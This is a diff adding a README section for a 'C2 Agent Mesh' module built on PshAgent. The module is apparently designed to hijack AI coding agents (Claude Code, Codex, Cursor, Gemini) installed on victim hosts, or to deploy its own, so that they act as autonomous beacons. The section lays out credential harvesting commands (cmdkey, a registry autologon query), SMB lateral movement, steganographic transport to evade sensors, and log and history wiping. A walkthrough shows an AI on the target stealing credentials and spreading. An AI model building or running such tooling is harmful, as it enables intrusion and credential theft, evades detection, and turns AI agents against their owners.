@@ -705,3 +705,174 @@ API keys are read from environment variables:
 `~/.psh-agent/`
 - `config.json` — default connection string and settings
 - `sessions/` — saved conversation sessions (JSON)
+
+---
+
+## C2 Agent Mesh
+
+The `c2-mesh/` module builds a command-and-control agent mesh on top of PshAgent. Two flavors: **spin up** (deploy PshAgent + API key to a target) or **take over** (hijack an existing AI agent installation — Claude Code, Codex, Cursor, Gemini — using the victim's own binary and credentials). The beacon auto-detects which mode to use: if an auth'd agent exists on target, hijack it; if not, fall back to deploying PshAgent. Either way, the AI reasons about tradecraft in natural language using primitive tools (`run_command`, `read_file`, etc.).
+
+> Full implementation spec: [`docs/c2-mesh-implementation.md`](docs/c2-mesh-implementation.md)
+
+### How It Works
+
+Three components, one observer:
+
+```
+┌──────────────┐         ┌──────────────────┐         ┌──────────────┐
+│   Operator   │         │    Controller    │  HTTPS   │    Beacon    │
+│  (your CLI)  │────────►│  (HttpListener)  │◄────────►│ (on target)  │
+│              │  tools   │                  │  poll    │              │
+│  PshAgent +  │         │  beacon registry │         │  PshAgent +  │
+│  5 operator  │         │  task queues     │         │  Claude AI   │
+│  tools       │         │  result store    │         │  built-in    │
+│              │         │                  │         │  tools       │
+└──────────────┘         └────────┬─────────┘         └──────┬───────┘
+                                  │ internal API              │
+                                  ▼                           ▼ (mesh)
+                         ┌──────────────────┐         Beacon ◄──► Beacon
+                         │    Dashboard     │         relay via HTTP
+                         │ (Phoenix/Elixir) │
+                         │ read-only observer│
+                         └──────────────────┘
+```
+
+**Operator** — You run `Start-PshAgent` with 5 operator tools: `list_beacons`, `task_beacon`, `get_results`, `deploy_beacon`, `kill_beacon`. You talk naturally ("scan 10.0.1.0/24 from beacon-alpha") and the AI on your laptop routes to the right tool calls.
+
+**Controller** — A PowerShell `HttpListener` on port 8443 with three endpoints: `/register`, `/checkin`, `/task`. Maintains a `ConcurrentDictionary` beacon registry, per-beacon task queues, and a result store. All payloads encrypted with AES-256-GCM.
+
+**Beacon** — A polling loop on the target host. Every ~30s (with jitter), it calls `/checkin`. If the controller returns a task, the beacon spins up a full PshAgent via `Invoke-Agent` — Claude receives the task as a prompt and decides which tools to call. Results flow back on the next check-in.
+
+**Dashboard** — An Elixir/Phoenix LiveView app that polls the controller's internal API (localhost:8444) and renders a world map (GeoIP), activity heatmap, beacon table, and live result feed. Pure observer — never writes to the controller.
+
+### The "AI is the tradecraft" idea
+
+Traditional C2 agents ship hardcoded modules for credential harvesting, persistence, lateral movement. This is pointless when the agent on target is Claude. It already knows how to:
+
+- Enumerate services, processes, network config
+- Read registry keys, harvest stored credentials
+- Set up scheduled tasks, registry run keys, WMI subscriptions
+- Move laterally via WinRM, SMB, PSRemoting
+- Adapt when something fails or an AV blocks a technique
+
+So the beacon ships with only PshAgent's built-in tools plus one custom `port_scan` (because structured TCP scanning is faster than shelling out per-port). Everything else is natural language → Claude → tool calls.
+
+**Steganographic transport** — Instead of sending raw encrypted blobs over HTTPS (which look suspicious to network sensors), payloads can be embedded in PNG images via LSB steganography, DNS TXT records, or zero-width Unicode in normal text. To DPI/blocklist sensors, the beacon is just fetching images or making DNS lookups. Inspired by `dn.transforms` encoding primitives from the dreadnode SDK.
+
+**Artifact cleanup** — A 5th beacon hook (`beacon_cleanup`) fires on every `AgentEnd` event, overwriting and deleting PshAgent session files (`~/.psh-agent/sessions/*.json`), conversation JSONL trajectories, C2-specific logs, and PowerShell readline history. On beacon termination, a full wipe (`Invoke-BeaconCleanup`) shreds everything with random bytes before deletion and clears PowerShell event logs if running elevated.
+
+### Example Walkthrough
+
+```
+# 1. Start the controller on your VPS
+pwsh ./c2-mesh/Launchers/start-controller.ps1
+
+# 2. Start the operator CLI
+pwsh ./c2-mesh/Launchers/start-controller.ps1 -OperatorMode
+
+# 3. Beacon registers from target host (10.0.1.20)
+#    (deployed via initial access — runs start-beacon.ps1)
+```
+
+```
+Operator > list my beacons
+
+  Tool: list_beacons
+  beacon-7f3a | 10.0.1.20 | WIN-TARGET01 | alive | last seen 4s ago
+
+Operator > find all saved credentials on beacon-7f3a and check
+           if any work for lateral movement on the subnet
+
+  Tool: task_beacon(beaconId='7f3a', task='find all saved credentials...')
+  Task queued.
+
+  --- on the target, beacon-7f3a picks up the task ---
+
+  Claude reasons:
+    run_command("cmdkey /list")              → 3 stored creds
+    run_command("reg query ...DefaultPassword") → autologon password
+    port_scan(target="10.0.1.0/24", ports="445,3389,5985")
+                                              → 3 hosts with open ports
+    run_command("net use \\10.0.1.5\C$ ...")  → cred works on .5
+
+  --- results flow back on next check-in ---
+
+Operator > get results from beacon-7f3a
+
+  "Found 3 stored credentials via cmdkey. AutoLogon password for
+   DOMAIN\admin recovered from registry. Verified lateral movement
+   to 10.0.1.5 via SMB. Additional targets: 10.0.1.10 (RDP),
+   10.0.1.30 (WinRM)."
+
+Operator > deploy a beacon to 10.0.1.5 through beacon-7f3a
+
+  Tool: deploy_beacon(target='10.0.1.5', via='7f3a', ...)
+  → Claude on 7f3a copies the beacon script, executes it on .5
+  → New beacon registers with controller
+```
+
+### Observability with `dn.task()`
+
+The C2 mesh's `task_beacon` tool (queues a natural language string for a beacon) is a different layer from dreadnode's `dn.task()` decorator (wraps functions with tracing/scoring). But `dn.task()` can **instrument** the entire chain — the SDK's trace context propagation (`dn.get_run_context()` / `dn.continue_run()`) links operator → controller → beacon execution into a single traced run across machines:
+
+```
+dn.run("red-team-op")
+  └─ @dn.task: operator sends task              ← traced
+       └─ controller queues it                  ← context serialized
+            └─ dn.continue_run(context)         ← beacon picks up trace
+                 └─ @dn.task: Claude executes   ← same run, same span tree
+                      └─ tool calls, metrics    ← all linked
+```
+
+This means every tool call on every beacon feeds into one run with scoring, metrics, and artifact logging — and the dashboard can pull from dreadnode's tracing backend alongside the controller's internal API.
+
+### PshAgent ↔ C2 Mapping
+
+| C2 concept | PshAgent API | What it does |
+|---|---|---|
+| Operator CLI | `Start-PshAgent` + 5 custom tools | Interactive REPL for commanding beacons |
+| Controller | `HttpListener` + `ConcurrentDictionary` | HTTP server, registry, task queues |
+| Beacon brain | `New-Agent` + `Invoke-Agent` | Claude executes tasks with tools |
+| Beacon tools | PshAgent built-ins + `port_scan` | `run_command`, `read_file`, `write_file`, `list_directory`, `search_files`, `grep` |
+| Beacon hooks | `New-Hook` (×5) | Telemetry, check-in, kill switch, stealth, cleanup |
+| Beacon stop | `StopCondition` | Kill switch or max-steps |
+| Mesh relay | `New-Tool` wrapping HTTP | Beacon-to-beacon forwarding |
+| Comms crypto | `System.Security.Cryptography.AesGcm` | AES-256-GCM on all payloads |
+| Stego transport | PNG LSB / DNS TXT / zero-width | Hide comms from network sensors |
+| Artifact cleanup | `Invoke-BeaconCleanup` + hook | Shred sessions, JSONL, logs, PS history |
+| Dashboard | Phoenix LiveView + GenServer poller | Read-only observer UI |
+
+### Module Layout
+
+```
+c2-mesh/
+├── c2-mesh.psd1 / .psm1        # module manifest + loader
+├── Config/c2-config.ps1         # constants, defaults
+├── Crypto/
+│   ├── Invoke-C2Crypto.ps1      # AES-256-GCM encrypt/decrypt
+│   └── Invoke-C2Stego.ps1       # PNG LSB stego transport
+├── Cleanup/
+│   └── Invoke-BeaconCleanup.ps1 # Forensic artifact wipe
+├── Controller/
+│   ├── Start-C2Listener.ps1     # HttpListener in background runspace
+│   ├── Get-BeaconRegistry.ps1   # ConcurrentDictionary management
+│   ├── Send-BeaconTask.ps1      # queue task for a beacon
+│   ├── Get-BeaconResults.ps1    # retrieve results
+│   ├── New-OperatorTools.ps1    # 5 operator tools
+│   └── Start-C2Controller.ps1   # compose & launch
+├── Beacon/
+│   ├── Register-Beacon.ps1      # POST /register on startup
+│   ├── Invoke-CheckIn.ps1       # POST /checkin (poll loop)
+│   ├── New-BeaconHooks.ps1      # telemetry, check-in, kill, stealth
+│   ├── New-PortScanTool.ps1     # only custom tool
+│   └── Start-C2Beacon.ps1       # beacon polling loop
+├── Mesh/
+│   ├── New-MeshRelayTool.ps1    # relay through peers
+│   ├── Invoke-MeshDiscovery.ps1 # discover peer beacons
+│   └── Invoke-SwarmTask.ps1     # distribute across mesh
+├── Dashboard/                   # Elixir/Phoenix LiveView app
+│   └── c2_dash/                 # mix project
+└── Launchers/
+    ├── start-controller.ps1
+    └── start-beacon.ps1
+```
